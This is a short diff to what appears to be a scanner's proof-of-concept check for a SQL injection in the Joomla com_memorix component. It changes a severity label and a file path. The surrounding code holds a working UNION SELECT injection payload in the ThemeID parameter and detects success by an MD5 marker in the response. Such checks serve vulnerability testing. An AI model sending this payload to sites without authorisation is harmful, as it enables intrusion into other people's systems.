@@ -23,7 +23,7 @@ class P(T):
         set_payload = 'index.php?option=com_memorix&task=result&searchplugin=theme&Itemid=60&ThemeID=-8594+union+select+111,222,MD5(1),444,555,666,777,888,999--+AbuHassan'
         code, head, res, errcode, _ = curl.curl(url + set_payload)
         if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
-            output(url,result,'info')
+            output(url,result,'低危(INFO)')
 
         del curl
         return result
@@ -35,7 +35,7 @@ def output(url,result,label):
     result['VerifyInfo'] = {}
     result['VerifyInfo']['type']='joomla Vul'
     result['VerifyInfo']['URL'] =url
-    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_f529437f40cc636d5ddaeedcc9d910de.py'
+    result['VerifyInfo']['payload']='/thirdparty/joomla/joomla_f529437f40cc636d5ddaeedcc9d910de.py'
     result['VerifyInfo']['level']=label
     result['VerifyInfo']['result'] =info
 
